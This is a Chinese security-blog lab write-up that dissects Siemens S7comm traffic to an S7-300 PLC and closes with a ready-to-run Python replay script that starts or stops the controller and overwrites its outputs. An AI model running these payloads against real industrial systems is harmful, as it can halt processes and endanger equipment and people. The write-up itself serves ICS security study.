## 0x1前言

**最近手头有个S7-300，根据之前多位大神S7协议相关的分析，决定自己动手实操一下，通过payload重放实现对PLC的启停及DO数据的读写，实验过程记录下来跟大家分享一下，欢迎各位大神来交流。**

## 0x2实验环境

PC1:

> 操作系统：win7 32位
>
> 相关软件：step7 v5.5 sp4 / wireshark_win32_2.2.1.0/snap7-1.4.2.7

PC2:

> 操作系统：win10 64位
>
> 相关软件：python2.7

PLC:

> S7-300:
>
> CPU：313C
>
> 固件版本：V3.3

## 0x3实验拓扑

![](https://image.3001.net/images/20190817/1566032848_5d57c3d04b83c.jpg!small)

其中，PC1主要用来对plc进行硬件组态和程序下载、执行操作命令（plc启停，数据的读写），并对通信过程进行抓包。PC2用来对plc进行重放攻击。

## 0x4初始化PLC

由于这个S7-300闲置多年，ip已经不知道了，手上也没有MPI线，好在有以太网模块，通过MAC地址连上plc，分享下方法：

![](https://image.3001.net/images/20190817/1566032867_5d57c3e36b14a.png!small)

以太网模块上有接口的mac地址，接上网线连接PC1，

![](https://image.3001.net/images/20190817/1566032875_5d57c3eb3cc4d.png!small)

打开step7，菜单栏选项->设置PG/PC接口

![](https://image.3001.net/images/20190817/1566032883_5d57c3f368732.png!small)

在访问路径中选择TCP/IP->自己的网卡，确定

![](https://image.3001.net/images/20190817/1566032898_5d57c402723af.png!small)

回到菜单栏，选择PLC->编辑Ethernet节点

![](https://image.3001.net/images/20190817/1566032905_5d57c4091bdb3.png!small)

输入我们刚刚获取的mac地址，点击浏览

![](https://image.3001.net/images/20190817/1566032914_5d57c4123cc3e.png!small)

这样就能找到以太网模块之前的ip地址了。如果这个模块是第一次使用（没有ip地址，IP地址栏为空），同样选择设备并确认

![](https://image.3001.net/images/20190817/1566032922_5d57c41aab8c0.png!small)

返回后在这里可以设置临时ip地址，设置完后，修改pc地址，保证在同一网段。

下面就是硬件组态了，这里就不赘述了，我这台设备因为之前用过，我就直接从plc上传组态信息及程序了，我们拿到一些需要的信息就可以了

![](https://image.3001.net/images/20190817/1566032931_5d57c4231de51.png!small)

菜单栏选择PLC->将站点上传到PG，

![](https://image.3001.net/images/20190817/1566032938_5d57c42ad571e.png!small)

首先选择插槽，S7-300一般为2，点击更新，稍等一会儿会弹出plc的信息，选择后点击确定，到这里，程序上载完成。

![](https://image.3001.net/images/20190817/1566032947_5d57c43325970.png!small)

查看硬件组态

![](https://image.3001.net/images/20190817/1566032954_5d57c43a5b610.png!small)

这样我们就获取了I/O模块的地址。到这里，我们拿到了需要的信息：

> IP地址：172.18.15.104
>
> DO地址：124-125

## 0x5 S7通信过程分析

这里我们采用的是snap7对plc进行启停操作和DO输出进行读写，并进行抓包。

Snap7这里就不多做介绍了，一款非常强大的工具，具体介绍请自行百度，我这里直接使用windows的客户端。

![](https://image.3001.net/images/20190817/1566032966_5d57c446c149b.png!small)

![](https://image.3001.net/images/20190817/1566032975_5d57c44f8a3e5.png!small)

S7的协议分析请参照[工控安全 | 西门子通信协议S7COMM](https://www.freebuf.com/articles/ics-articles/188159.html)，非常详细，这里根据我的理解做个简单描述。

![](https://image.3001.net/images/20190817/1566032985_5d57c459332aa.png!small)

S7的通讯大致分为4个过程，分别是：

> 1.TCP三次握手：这个没什么好说的，大家都懂。
>
> 2.COTP握手：COTP部分分为两种：COTP连接包和COTP功能包，COTP握手阶段使用的是COTP连接包，S7数据传输阶段使用的是COTP功能包。
>
>
> 3.S7COMM建联：S7COMM作为COTP的有效载荷，主要包含三部分：Header、Parameter、Data，建联阶段S7COMM只包含Header和Parameter两个字段。

下面通过wireshark截图详细了解下整个过程：

### Step1：三次握手

![](https://image.3001.net/images/20190817/1566032996_5d57c46428e89.png!small)

### Step2：COTP握手

请求报文：

![](https://image.3001.net/images/20190817/1566033005_5d57c46d570d1.png!small)

![](https://image.3001.net/images/20190817/1566033012_5d57c4744a331.png!small)

主要由TPKT和COTP组成，TPKT中的Length为 TPKT\COTP\S7三层协议的总长度

COTP中的Length为COTP后续数据长度，一般为17

PDU type：

> 0×1: ED Expedited Data，加急数据
>
> 0×2: EA Expedited Data Acknowledgement，加急数据确认
>
> 0×4: UD，用户数据
>
> 0×5: RJ Reject，拒绝
>
> 0×6: AK Data Acknowledgement，数据确认
>
> 0×7: ER TPDU Error，TPDU错误
>
> 0×8: DR Disconnect Request，断开请求
>
> 0xC: DC Disconnect Confirm，断开确认
>
> 0xD: CC Connect Confirm，连接确认
>
> 0xE: CR Connect Request，连接请求
>
> 0xF: DT Data，数据传输

此处值为0x0e，表示连接请求

响应报文：

注意PDU Type的变化

![](https://image.3001.net/images/20190817/1566033032_5d57c488d4e84.png!small)

![](https://image.3001.net/images/20190817/1566033039_5d57c48f2ecf8.png!small)

### Step3：S7建联

作业请求：

![](https://image.3001.net/images/20190817/1566033046_5d57c496787db.png!small)

COTP功能吗为0x0f，对照上表，数据传输

![](https://image.3001.net/images/20190817/1566033060_5d57c4a49ae89.png!small)

0x32为协议号

ROSCTR，操作类型：

> 0×01 – JOB(Request： job
> withacknowledgement)：作业请求。由主设备发送的请求（例如，读/写存储器，读/写块，启动/停止设备，设置通信）；
>
> 0×02 – ACK(acknowledgement without additional field)：确认响应，没有数据的简单确认（未遇到过由S7
> 300/400设备发送得）；
>
> 0×03 – ACK_DATA(Response： acknowledgementwith additional
> field)：确认数据响应，这个一般都是响应JOB的请求；
>
> 0×07 – USERDATA：原始协议的扩展，参数字段包含请求/响应ID（用于编程/调试，读取SZL，安全功能，时间设置，循环读取…）。

此处为01，表示作业请求

Data length：数据长度，读取plc数据请求时，无数据，因此为0

![](https://image.3001.net/images/20190817/1566033070_5d57c4aec9ee8.png!small)

Parameter中记录了功能码，Setup communication [0xF0]表示建立通信的请求

![](https://image.3001.net/images/20190817/1566033078_5d57c4b60bacc.png!small)

作业应答：

PLC的S7应答响应：Setupcommunication [0xF0]

Header中的ROSCTR变为ACK_DATA，响应请求中的job

![](https://image.3001.net/images/20190817/1566033087_5d57c4bf39b47.png!small)

### Step4：停止plc报文

COTP的PDU为数据传输(功能包)，S7层的header中请求类型为job，plc stop的功能码为0x29

![](https://image.3001.net/images/20190817/1566033094_5d57c4c6f3a83.png!small)

重放即可。

### Step5：读取PLC DO数据

请求报文：

主要有以下几个点：

> 1.功能码：04读取数据
>
> 2.读取的数据类型：82 output（Q）
>
> 3.数据地址的计算：0x0003e0

需要注意的一点是，我们DO的数据地址为124，这里的地址编码为0x0003e0，直接计算会发现并不等于124，通过报文可以发现，0x0003e0中包含了位地址，所以需要去除最后三位再计算，也就是1111100，即十进制的124。

![](https://image.3001.net/images/20190817/1566033104_5d57c4d046f3c.png!small)

应答报文：

应答包相对比较简单，其Parameter只有function、itemcount两个字段，返回00，DO的16位输出都为0。

![](https://image.3001.net/images/20190817/1566033110_5d57c4d6edcd0.png!small)

### Step6：写入PLC DO值

和read相比，除了parameter，S7多了data部分，因为要写入数值

![](https://image.3001.net/images/20190817/1566033119_5d57c4df69363.png!small)

具体报文，写操作功能码05，item部分不变，指定数据类型及地址，data部分为写入数据信息，此处写入ff，全部为1

![](https://image.3001.net/images/20190817/1566033127_5d57c4e740eb3.png!small)

上面提到的item，每个item代表了一段地址，比如上图报文中一共有5个item，除了第一个是outputs（Q）地址，后面4个都是DB地址，我们可以根据自己的需求进行修改，比如删除后面的4个item，需要注意的是，删除了报文的其他部分也要做出对应的修改，否则无法重放。这里标出需要修改的关于长度计算的数据段：

![](https://image.3001.net/images/20190817/1566033138_5d57c4f2aff62.png!small)

![](https://image.3001.net/images/20190817/1566033146_5d57c4fa22777.png!small)

## 0x6 S7重放攻击

重放攻击，首先还是要根据S7通信特征建立连接，然后通过抓到的数据包构造各种行为的payload，通过对协议的分析和理解，还可以根据自己的需求对payload进行一定的修改。

附上我重放的python脚本（参考了[isf](https://github.com/dark-lbp/isf)中的s7_300_400_plc_control.py）

    
    
    import socket
    
    import time
    
    import sys
    
      
    
    
    arg = int(sys.argv[1])
    
      
    
    
    setup_communication_payload = '0300001902f08032010000020000080000f0000002000201e0'.decode('hex')
    
    cpu_start_payload = "0300002502f0803201000005000014000028000000000000fd000009505f50524f4752414d".decode('hex')
    
    cpu_stop_payload = "0300002102f0803201000047000010000029000000000009505f50524f4752414d".decode('hex')
    
    set_do_var="0300002502f080320100004300000e00060501120a100200020000820003e0000400105555".decode('hex')
    
      
    
    
    class Exploit():
    
        target = '172.18.15.104'
    
        port = 102
    
        slot = 2
    
        command = arg
    
        sock = None
    
      
    
    
        def create_connect(self, slot):
    
            slot_num = chr(slot)
    
            create_connect_payload = '0300001611e00000001400c1020100c20201'.decode('hex') + slot_num + 'c0010a'.decode('hex')
    
            self.sock.send(create_connect_payload)
    
            self.sock.recv(1024)
    
            self.sock.send(setup_communication_payload)
    
            self.sock.recv(1024)
    
      
    
    
        def exploit(self):
    
            self.sock = socket.socket()
    
            self.sock.connect((self.target, self.port))
    
            self.create_connect(self.slot)
    
            if self.command == 1:
    
                print("Start plc")
    
                self.sock.send(cpu_start_payload)
    
            elif self.command == 2:
    
                print("Stop plc")
    
                self.sock.send(cpu_stop_payload)
    
            elif self.command == 3:
    
                print("set DO 0101 01010 1010 1010")
    
                self.sock.send(set_do_var)
    
            else:
    
                print("Command %s didn't support" % self.command)
    
      
    
    
        def run(self):
    
            if self._check_alive():
    
                print("Target is alive")
    
                print("Sending packet to target")
    
                self.exploit()
    
                if not self._check_alive():
    
                    print("Target is down")
    
            else:
    
                print("Target is not alive")
    
      
    
    
        def _check_alive(self):
    
            try:
    
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
                sock.settimeout(1)
    
                sock.connect((self.target, self.port))
    
                sock.close()
    
            except Exception:
    
                return False
    
            return True
    
           
    
    if __name__ == '__main__':
    
        x=Exploit()
    
        x.run()

运行时命令行需要传入一个指令参数：  

> 1：run plc
>
> 2：stop plc
>
> 3：set DO 0101 01010 1010 1010

最后是演示图：

![](https://image.3001.net/images/20190818/1566137265_5d595bb1bfb49.png!small)

![](https://image.3001.net/images/20190817/1566033256_5d57c5686d8dd.png!small)

![](https://image.3001.net/images/20190817/1566033263_5d57c56f6112e.png!small)

![](https://image.3001.net/images/20190817/1566033281_5d57c581b2951.png!small)

![](https://image.3001.net/images/20190817/1566033293_5d57c58de8136.png!small)

![](https://image.3001.net/images/20190817/1566033310_5d57c59edba59.png!small)

演示到这里也就结束了，有兴趣的可以对DO写个跑马灯，S7协议的重放攻击危害还是挺大的。真实场景中直接启停plc以及控制PLC输出是非常危险的，重放攻击能做的还有很多，取决于对S7协议的理解程度，上述内容中描述有误的，还望大神们多多指教。

## 参考：

> [工控安全 | 西门子通信协议S7COMM（Part 1）](https://www.freebuf.com/articles/ics-> articles/188159.html)
>
> [工控安全 | 西门子通信协议S7COMM（Part 2）](https://www.freebuf.com/articles/ics-> articles/188606.html)
>
> <https://github.com/dark-lbp/isf>

***本文作者：leoyyx，转载请注明来自FreeBuf.COM**

